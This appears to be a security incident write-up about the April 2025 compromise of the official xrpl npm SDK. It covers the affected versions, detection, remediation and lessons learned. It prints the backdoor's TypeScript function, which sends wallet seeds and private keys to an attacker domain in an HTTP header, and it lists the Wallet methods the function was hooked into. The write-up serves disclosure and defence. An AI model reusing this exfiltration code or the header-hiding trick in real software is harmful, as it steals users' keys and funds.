# XRP Ledger Supply Chain Attack

**Date:** April 2025
**Ecosystem:** npm
**Severity:** Critical
**Type:** Backdoored official SDK / Private key theft
**Sources:**
- [aikido.dev — XRP supply chain attack: Official NPM package infected with crypto stealing backdoor](https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor)

---

## Summary

The official `xrpl` npm package — the XRP Ledger SDK with over **140,000 weekly downloads** — was compromised by attackers who injected a cryptocurrency private key stealing backdoor. Five malicious versions were published by the compromised npm account `mukulljangid` starting April 21, 2025 at 20:53 UTC. The backdoor silently exfiltrated wallet private keys and seed phrases to an attacker-controlled domain whenever a Wallet object was created, derived, or used. Aikido Intel detected the attack and published disclosure on April 22, 2025.

The attack window was approximately 16 hours (April 21 20:53 – April 22 13:00 UTC). Any XRP wallet keys processed during this window should be considered compromised.

---

## Compromised Packages

| Package | Malicious Version(s) |
|---------|---------------------|
| `xrpl` | 4.2.1, 4.2.2, 4.2.3, 4.2.4, 2.14.2 |

**Note:** Versions did not match the official GitHub releases (latest legitimate release was 4.2.0), which was the first red flag Aikido observed.

---

## How It Worked

### Backdoor Payload

The attacker added a `checkValidityOfSeed()` function to `src/index.ts`:

```ts
const validSeeds = new Set<string>([])

export function checkValidityOfSeed(seed: string) {
  if (validSeeds.has(seed)) return
  validSeeds.add(seed)
  fetch("https://0x9c[.]xyz/xc", {
    method: 'POST',
    headers: {
      'ad-referral': seed,
    }
  })
}
```

This function was then called from multiple critical Wallet methods in `src/Wallet/index.ts`:

- `Wallet` constructor — fires when any wallet is instantiated, passing `privateKey`
- `Wallet.fromSeed()` — fires with the seed string
- `Wallet.generate()` — fires with the newly generated seed
- `Wallet.fromMnemonic()` — fires with the BIP-39 mnemonic
- `Wallet.fromEntropy()` — fires with the derived seed
- `Wallet.deriveWallet()` — fires with the private key

Every path a developer could use to create or restore an XRP wallet would silently POST the private key or seed to `0x9c[.]xyz` via the `ad-referral` HTTP header — making the exfiltration blend in with normal HTTP traffic headers.

### Iterative Attack Development

The attacker iterated across versions, suggesting active development during the attack:

- **4.2.1** — Removed scripts and prettier config from `package.json`; no malicious TypeScript yet
- **4.2.2** — First version with malicious `src/Wallet/index.js`; both `.js` build files modified manually
- **4.2.3 / 4.2.4** — Backdoor moved into TypeScript source (`src/index.ts`, `src/Wallet/index.ts`) and compiled; cleaner, harder to detect

This progression shows the attacker working to make the backdoor less obvious with each iteration — moving from manual JS injection to a compiled TypeScript approach.

### C2 Domain

`0x9c[.]xyz` — newly registered domain at the time of the attack (confirmed via WHOIS). The short, hexadecimal-style name blends in as a plausible developer-facing domain.

---

## Detection

```bash
# Check if you have a compromised xrpl version installed
npm ls xrpl

# Check package.json and package-lock.json for these exact versions:
# 4.2.1, 4.2.2, 4.2.3, 4.2.4, 2.14.2

# If installed during Apr 21 20:53 – Apr 22 13:00 UTC, check network logs:
# Look for outbound POST requests to: 0x9c.xyz
```

If you installed `xrpl` with an approximate version specifier like `~4.2.0` or `^4.2.0` (without a lockfile), you may have silently auto-upgraded to a malicious version.

---

## Remediation

1. **Upgrade immediately** to the patched versions: `4.2.5` or `2.14.3`
2. **Assume all keys are compromised** if you used any Wallet methods during the attack window — treat all private keys and seeds processed by the affected library as exposed
3. **Move funds immediately** — transfer any assets from wallets created or used with a compromised version to a new wallet generated from a clean environment
4. **Check network logs** for outbound connections to `0x9c.xyz` between April 21–22, 2025

---

## Lessons Learned

- **Version mismatch is a red flag.** Packages published to npm without a corresponding GitHub release warrant immediate investigation.
- **Official packages are not immune.** A compromised npm account can publish malicious versions of even the most trusted, widely-used SDKs.
- **The `ad-referral` header trick.** Exfiltrating stolen data via a standard HTTP header (rather than a request body) makes the exfiltration blend into normal web traffic noise.
- **Lockfiles are essential.** Developers using `^` or `~` version ranges without lockfiles are one `npm install` away from picking up a malicious patch version.

---

## Related Incidents

- [The Great npm Heist (Sep 2025)](./2025-09-great-npm-heist.md) — also targeting cryptocurrency wallets (Bitcoin, Ethereum, Tron)
- [GlassWorm / CanisterWorm (Mar 2026)](./2026-03-glassworm-canisterworm.md) — similar multi-crypto wallet targeting (71 extension IDs)
